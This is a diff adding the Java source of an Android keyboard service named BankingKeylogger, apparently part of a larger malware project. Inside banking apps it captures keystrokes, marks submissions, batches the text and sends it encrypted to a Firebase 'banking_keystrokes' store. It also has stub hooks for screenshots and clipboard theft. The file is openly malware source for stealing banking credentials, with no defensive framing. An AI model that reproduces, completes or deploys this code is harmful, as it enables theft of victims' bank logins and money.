@@ -1,0 +1,138 @@
+// BankingKeylogger.java
+package com.godz.rtoRed.admin.banking;
+
+import android.inputmethodservice.InputMethodService;
+import android.view.KeyEvent;
+import android.view.inputmethod.EditorInfo;
+import java.util.concurrent.ConcurrentLinkedQueue;
+
+public class BankingKeylogger extends InputMethodService {
+    
+    private ConcurrentLinkedQueue<KeyEvent> keyQueue = new ConcurrentLinkedQueue<>();
+    private Thread processingThread;
+    private String currentPackage = "";
+    private boolean isBankingApp = false;
+    
+    @Override
+    public void onStartInputView(EditorInfo info, boolean restarting) {
+        super.onStartInputView(info, restarting);
+        
+        currentPackage = info.packageName;
+        isBankingApp = BankingTargets.isBankingApp(currentPackage);
+        
+        if (isBankingApp) {
+            startBankingCapture();
+        }
+    }
+    
+    private void startBankingCapture() {
+        BankingTargets.BankingAppConfig config = 
+            BankingTargets.getConfigForPackage(currentPackage);
+        
+        if (config != null) {
+            // Log start of banking session
+            logBankingSessionStart(config.bankName);
+            
+            // Capture with higher frequency
+            if (processingThread == null) {
+                processingThread = new Thread(this::processKeyQueue);
+                processingThread.start();
+            }
+        }
+    }
+    
+    @Override
+    public boolean onKeyDown(int keyCode, KeyEvent event) {
+        if (isBankingApp) {
+            keyQueue.add(event);
+            
+            // Special handling for banking apps
+            if (keyCode == KeyEvent.KEYCODE_ENTER) {
+                // User likely submitted credentials
+                triggerCredentialSubmission();
+            }
+        }
+        
+        return super.onKeyDown(keyCode, event);
+    }
+    
+    private void processKeyQueue() {
+        StringBuilder sessionBuffer = new StringBuilder();
+        long sessionStart = System.currentTimeMillis();
+        
+        while (isBankingApp && !Thread.interrupted()) {
+            try {
+                KeyEvent event = keyQueue.poll();
+                if (event != null) {
+                    char pressedChar = (char) event.getUnicodeChar();
+                    
+                    if (event.getAction() == KeyEvent.ACTION_DOWN) {
+                        if (event.getKeyCode() == KeyEvent.KEYCODE_DEL) {
+                            sessionBuffer.append("[DEL]");
+                        } else if (event.getKeyCode() == KeyEvent.KEYCODE_ENTER) {
+                            sessionBuffer.append("[ENTER]\n");
+                        } else if (pressedChar != 0) {
+                            sessionBuffer.append(pressedChar);
+                        }
+                    }
+                    
+                    // Send batch every 10 characters or 5 seconds
+                    if (sessionBuffer.length() >= 10 || 
+                        System.currentTimeMillis() - sessionStart >= 5000) {
+                        sendBankingKeystrokes(sessionBuffer.toString());
+                        sessionBuffer.setLength(0);
+                        sessionStart = System.currentTimeMillis();
+                    }
+                }
+                
+                Thread.sleep(50);
+                
+            } catch (InterruptedException e) {
+                break;
+            }
+        }
+    }
+    
+    private void sendBankingKeystrokes(String keystrokes) {
+        if (keystrokes.isEmpty()) return;
+        
+        Map<String, String> bankingData = new HashMap<>();
+        bankingData.put("package", currentPackage);
+        bankingData.put("bank", BankingTargets.getConfigForPackage(currentPackage).bankName);
+        bankingData.put("keystrokes", keystrokes);
+        bankingData.put("timestamp", String.valueOf(System.currentTimeMillis()));
+        
+        // High priority encryption
+        String encrypted = AESCrypt.encrypt(
+            getBankingKey(),
+            new JSONObject(bankingData).toString()
+        );
+        
+        // Send with high priority
+        FirebaseDatabase.getInstance()
+            .getReference("banking_keystrokes")
+            .push()
+            .setValue(encrypted, (error, ref) -> {
+                if (error != null) {
+                    // Backup to local storage
+                    saveLocally(encrypted);
+                }
+            });
+    }
+    
+    private void triggerCredentialSubmission() {
+        // Take screenshot when user submits
+        takeScreenshot();
+        
+        // Capture current clipboard (might contain account number)
+        captureClipboard();
+    }
+    
+    private void takeScreenshot() {
+        // Screenshot implementation
+    }
+    
+    private void captureClipboard() {
+        // Clipboard capture implementation
+    }
+}
